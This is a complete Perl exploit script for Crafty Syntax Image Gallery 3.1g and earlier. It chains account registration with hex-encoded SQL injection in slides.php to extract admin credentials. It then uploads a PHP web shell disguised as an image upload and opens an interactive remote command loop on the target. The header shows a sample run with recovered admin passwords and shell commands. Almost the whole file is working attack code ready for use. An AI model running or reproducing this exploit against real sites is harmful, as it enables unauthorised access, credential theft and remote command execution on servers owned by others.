#!/usr/bin/perl
###############################################################################
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
###############################################################################

# =====================================================
# $ crappy_syntax.pl localhost/csig/ 80
#
# :: crafty syntax image gallery <= 3.1g
# :: by undefined1_ @ bash-x.net/undef/
# :: note: this works only on mysql >= 4.0
#
#
# [+] creating user account
# [+]		user: 98fe56123
#			password: 7652L4M3l39q
#			email: SehswdSx0E@hotmail.com
# [+] user '98fe56123' with password '7652L4M3l39q' registered
# [+] logged in as 98fe56123
# [+] projectid is 2
# [-] no admin found for this projectid, trying the username 'admin'
# [+] admin username: 'admin'
# [+] admin password: '1111'
# [+] logged in as 'admin'
# [+] getting shell location
# [+] shell @ 'userimages/1/18d76bcbc6f2.php'
# [+] have phun?
#
# localhost$ uname
# Linux
# localhost$ whoami
# nobody
# =====================================================

use strict; 
use IO::Socket;

$| = 1;
print ":: crafty syntax image gallery <= 3.1g\n";
print ":: by undefined1_ @ bash-x.net/undef/\n";
print ":: note: this works only on mysql >= 4.0\n\n\n";

my $website = shift || usage();
my $port = shift || usage();
my $user = shift;
my $password = shift;
my $location = shift;



my $path = "/";
my $server = $website;
if(index($website, "/") != -1)
{
	$path = substr($website, index($website, "/"));
	$server = substr($website, 0, index($website, "/"));
	if(substr($path, length($path)-1) ne "/")
	{
		$path .= "/";
	}
}
if($location eq "")
{
	if($user eq "" && $password eq "")
	{
		print "[+] creating user account\n";
		$user = randstring(8,12);
		$password = randstring(8,12);
		my $email = randstring(8,12)."\@hotmail.com";
		printf("[+]\tuser: %s\n", $user);
		printf("\tpassword: %s\n", $password);
		printf("\temail: %s\n", $email);
		register($server, $path, $user, $user, $password, $email);
	}

	my $cookies = login($server, $port, $path, $user, $password);
	my $projectid = get_projectid($server, $port, $path, $cookies);
	my @admin = send_payload($server, $port, $path, $cookies, $projectid);

	$cookies = login($server, $port, $path, $admin[0], $admin[1]);
	upload_shell($server, $port, $path, $cookies, $projectid);
	$location = get_shell_location($server,$port,$path,$cookies);
}

check_shell($server, $port, $path, $location);
printf("[+] have phun?\n\n");
my $command;
while(1) 
{
	print $server."\$ ";
	while(<STDIN>) 
	{
		$command = $_;
		chomp($command);
		last;
	}
	do_shell($server,$port,$path,$location,$command);
}


sub send_payload(\$,\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $path = shift;
	my $cookies = shift;
	my $projectid = shift;
	my $shellcode;

	$shellcode  = "\x61\x6e\x64\x20\x31\x3d\x30\x20\x75\x6e\x69\x6f\x6e\x20";
	$shellcode .= "\x61\x6c\x6c\x20\x73\x65\x6c\x65\x63\x74\x20\x31\x2c\x32";
	$shellcode .= "\x2c\x33\x2c\x34\x2c\x35\x2c\x75\x73\x65\x72\x69\x64\x20";
	$shellcode .= "\x61\x73\x20\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e";
	$shellcode .= "\x2c\x37\x2c\x38\x2c\x39\x2c\x30\x2c\x31\x2c\x32\x2c\x33";
	$shellcode .= "\x2c\x34\x2c\x35\x2c\x35\x20\x66\x72\x6f\x6d\x20\x67\x61";
	$shellcode .= "\x6c\x6c\x65\x72\x79\x5f\x61\x63\x63\x65\x73\x73\x20\x77";
	$shellcode .= "\x68\x65\x72\x65\x20\x67\x61\x6c\x6c\x65\x72\x79\x69\x64";
	$shellcode .= "\x3d";
	$shellcode .= $projectid;
	$shellcode .= "\x20\x61\x6e\x64\x20\x70\x65\x72\x6d\x69\x73\x73\x69\x6f";
	$shellcode .= "\x6e\x73\x3d\x43\x4f\x4e\x43\x41\x54\x28\x30\x78\x34\x36";
	$shellcode .= "\x35\x35\x34\x63\x34\x63\x29\x20\x2d\x2d";

	my $query = "GET ".$path."slides.php?limitquery_s=".urlEncode($shellcode)." HTTP/1.1\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= $cookies;
	$query .= "\r\n";
	my $data = sendpacket($server, $port, $query);
	if($data !~ /photo_captions\[1\] = "/)
	{
		print "[-] no admin found for this projectid, trying the username 'admin'\n";
		$shellcode = "and 1=0 union all select 1,username as image,3,4,5,password AS description,7,8,9,10,11,12,13,14,15,16 from gallery_users where username=CONCAT(0x61646d696e) --";
		$query = "GET ".$path."slides.php?limitquery_s=".urlEncode($shellcode)." HTTP/1.1\r\n";
		$query .= "Host: $server\r\n";
		$query .= "User-Agent: Mozilla/5.0\r\n";
		$query .= "Connection: close\r\n";
		$query .= $cookies;
		$query .= "\r\n";
		my $data = sendpacket($server, $port, $query);
		if($data !~ /photo_captions\[1\] = "/ || $data !~ /photo_urls\[1\] = "/)
		{
			print "[-] exploit failed\n";
			exit;
		}
		my $index1 = index($data, "photo_captions[1] = \" ") + 22;
		my $index2 = index($data, "\"", $index1);
		my $passwd = substr($data, $index1, $index2-$index1);

		$index1 = index($data, "photo_urls[1] = \"") + 17;
		$index2 = index($data, "\"", $index1);
		$data = substr($data, $index1, $index2-$index1);
		$index1 = rindex($data, "/") + 1;
		my $username = substr($data, $index1);


		print "[+] admin username: '$username'\n";
		print "[+] admin password: '$passwd'\n";

		my @ret;
		push(@ret, $username);
		push(@ret, $passwd);
		return @ret;
	}
	my $index1 = index($data, "photo_captions[1] = \" ") + 22;
	my $index2 = index($data, "\"", $index1);
	my $uid = substr($data, $index1, $index2-$index1);
	print "[+] admin uid: '$uid'\n";





	$shellcode = "and 1=0 union all select 1,username as image,3,4,5,password AS description,7,8,9,10,11,12,13,14,15,16 from gallery_users where recno=".$uid." --";
	$query = "GET ".$path."slides.php?limitquery_s=".urlEncode($shellcode)." HTTP/1.1\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= $cookies;
	$query .= "\r\n";
	my $data = sendpacket($server, $port, $query);
	if($data !~ /photo_captions\[1\] = "/ || $data !~ /photo_urls\[1\] = "/)
	{
		print "[-] exploit failed (mysql < 4 ?)\n";
		exit;
	}
	$index1 = index($data, "photo_captions[1] = \" ") + 22;
	$index2 = index($data, "\"", $index1);
	my $passwd = substr($data, $index1, $index2-$index1);

	$index1 = index($data, "photo_urls[1] = \"") + 17;
	$index2 = index($data, "\"", $index1);
	$data = substr($data, $index1, $index2-$index1);
	$index1 = rindex($data, "/") + 1;
	my $username = substr($data, $index1);


	print "[+] admin username: '$username'\n";
	print "[+] admin password: '$passwd'\n";

	my @ret;
	push(@ret, $username);
	push(@ret, $passwd);
	return @ret;
}


sub do_shell(\$,\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $path = shift;
	my $location = shift;
	my $command = shift;

	my $d = "c=".$command;
	my $query = "POST ".$path.$location." HTTP/1.1\r\n";
	$query .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= "Content-Length: ".length($d)."\r\n";
	$query .= "\r\n";
	$query .= $d;
	
	my $data = sendpacket($server, $port, $query);
	my $index = index($data, "\r\n\r\n");
	if($index >= 0)
	{
		print substr($data, $index+4)."\n";
	}
	else
	{
		print "[-] shell error?\n";
	}
}

sub check_shell(\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $path = shift;
	my $location = shift;

	
	my $query = "GET ".$path.$location." HTTP/1.1\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= "\r\n";
	my $data = sendpacket($server, $port, $query);

	if($data !~ /HTTP\/1.1 200 OK/)
	{
		print "[-] shell not found\n";
		print "[-] try ".$server.$path."/userimages/\n";
		exit;
	}
}

sub get_shell_location(\$,\$,\$,\$) {	
	print "[+] getting shell location\n";
	my $server = shift;
	my $port = shift;
	my $path = shift;
	my $cookies = shift;
	my $shellcode;

	$shellcode  = "\x61\x6e\x64\x20\x69\x6d\x61\x67\x65\x20\x4c\x49\x4b\x45\x20\x43";
	$shellcode .= "\x4f\x4e\x43\x41\x54\x28\x30\x78\x32\x35\x32\x65\x37\x30\x36\x38";
	$shellcode .= "\x37\x30\x29\x20\x6f\x72\x64\x65\x72\x20\x62\x79\x20\x72\x65\x63";
	$shellcode .= "\x6e\x6f\x20\x64\x65\x73\x63\x20\x6c\x69\x6d\x69\x74\x20\x31\x20";
	$shellcode .= "\x2d\x2d";

	
	my $query = "GET ".$path."slides.php?limitquery_s=".urlEncode($shellcode)." HTTP/1.1\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= $cookies;
	$query .= "\r\n";
	my $data = sendpacket($server, $port, $query);
	if($data =~ /There are no photos in this gallery/)
	{
		print "[-] shell not found\n";
		print "[-] try ".$server.$path."/userimages/\n";
		exit;
	}

	my $index1 = index($data, "photo_urls[1] = \"") + 17;
	my $index2 = index($data, "\"", $index1);
	my $location = substr($data, $index1, $index2-$index1);
	print "[+] shell @ '".$location."'\n";
	return $location;
}

sub get_projectid(\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $path = shift;
	my $cookies = shift;
	
	my $query = "GET ".$path."imagemenu.php?html=menu.tpl HTTP/1.1\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= $cookies;
	$query .= "\r\n";
	my $data = sendpacket($server, $port, $query);
	my $projectid;
	if($data =~ /\?projectid=([0-9]*)/)
	{
		$projectid = $1;
	}
	else
	{
		print "[-] no projectid found";
		exit;
	}

	print "[+] projectid is '$projectid'\n";
	return $projectid;
}

sub upload_shell(\$,\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $path = shift;
	my $cookies = shift;
	my $projectid = shift;
	
	my $query = "GET ".$path."newimage.php?projectid=".$projectid." HTTP/1.1\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= $cookies;
	$query .= "\r\n";
	my $data = sendpacket($server, $port, $query);
	if($data =~ /Access denied.../)
	{
		print "[-] no admin privileges (mysql < 4.0 ?)\n";
		exit;
	}

	my $shell = "<? if(isset(\$_POST['c'])) { system(\$_POST['c']); } ?>";

	my $boundary = "-----------------------------220162907215434";
	my $post = "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"projectid\"\r\n\r\n";
	$post .= $projectid."\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"A_MONTH\"\r\n\r\n";
	$post .= "03\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"A_DAY\"\r\n\r\n";
	$post .= "26\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"A_YEAR\"\r\n\r\n";
	$post .= "2006\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"fullimage\"; filename=\"my_image.jpg\"\r\n";
	$post .= "Content-Type: text/plain\r\n\r\n";
	$post .= $shell."\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"description\"\r\n\r\n";
	$post .= "another image\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"ext\"\r\n\r\n";
	$post .= ".php\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"feature__".$projectid."\"\r\n\r\n";
	$post .= "Y\r\n";

	$post .= "--".$boundary."\r\n";
	$post .= "Content-Disposition: form-data; name=\"addnow\"\r\n\r\n";
	$post .= "ADD\r\n";

	$post .= "--".$boundary."--\r\n";

	my $query  = "POST ".$path."newimage.php?projectid=".$projectid." HTTP/1.1\r\n";
	$query .= "Content-Type: multipart/form-data; boundary=".$boundary."\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= $cookies;
	$query .= "Content-Length: ".length($post)."\r\n";
	$query .= "\r\n";
	$query .= $post;

	sendpacket($server, $port, $query);
}

sub login(\$,\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $path = shift;
	my $username = shift;
	my $password = shift;

	my $d = "whattodo=login&myusername=".$username."&mypassword=".$password;
	my $query = "POST ".$path."index.php HTTP/1.1\r\n";
	$query .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= "Content-Length: ".length($d)."\r\n";
	$query .= "\r\n";
	$query .= $d;

	my $data = sendpacket($server, $port, $query);
	if($data =~ /<td><b>Your Name:<\/td><td><input type=text name=myusername/ || $data !~ /Set-Cookie: /)
	{
		print "[-] failed to login\n";
		exit;
	}
	
	my $cookies = "";	# chocolate cookies
	my $index1 = index($data, "\r\n\r\n");
	if($index1 >= 0)
	{
		my $index2 = index($data, "Set-Cookie: ") + 12;
		my $index3 = index($data, "\r\n", $index2);
		$cookies = "Cookie: ".substr($data, $index2, $index3-$index2+2);
	}
	
	print "[+] logged in as '$username'\n";
	return $cookies;
}

sub register(\$, \$, \$, \$, \$, \$, \$) {
	my $server = shift;
	my $path = shift;
	my $name = shift;
	my $user = shift;
	my $password = shift;
	my $email = shift;

	my $d = "action=register&emailadd=".$email."&newname=".$name."&newusername=".$user."&newpassword=".$password;
	my $query = "POST ".$path."lostsheep.php HTTP/1.1\r\n";
	$query .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$query .= "Host: $server\r\n";
	$query .= "User-Agent: Mozilla/5.0\r\n";
	$query .= "Connection: close\r\n";
	$query .= "Content-Length: ".length($d)."\r\n";
	$query .= "\r\n";
	$query .= $d;

	my $data = sendpacket($server, $port, $query);
	if($data =~ /<li>Sorry the username you entered <b><\/b> is already taken.. try again/)
	{
		print "[-] failed: username taken\n";
		exit;
	}
	if($data =~ /you did not enter in a/)
	{
		print "[-] failed\n";
		exit;
	}
	print "[+] user '$user' with password '$password' registered\n";
}

sub sendpacket(\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $request = shift;

	my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $server, PeerPort => $port) or die "[-] Could not connect to $server:$port $!\n";
	print $sock "$request";

	
	my $data = "";
	my $answer;
	while($answer = <$sock>)
	{
		$data .= $answer;
	}
	
	close($sock);
	return $data;
}

sub randstring(\$,\$) {
	my $min = shift;
	my $max = shift;

	my $length = int( (rand(65535)%($max-$min+1))+$min);
	my $ret = "";
	for(my $i = 0; $i < $length; $i++)
	{
		my $w = int(rand(3));
		if($w == 0)
		{
			$ret .= chr(97 + int(rand(26)));
		}
		elsif($w == 1)
		{
			$ret .= chr(65 + int(rand(26)));
		}
		else
		{
			$ret .= chr(48 + int(rand(10)));
		}
	}

	return $ret;
}


sub usage() {
	printf "usage: %s <website> <port> [user(optional)] [password(optional)] [shell path without trailing / (optional)]\n", $0;
	printf "exemple: %s www.site.com/csig/ 80\n", $0;
	exit;
}


sub urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
    return $string;
}

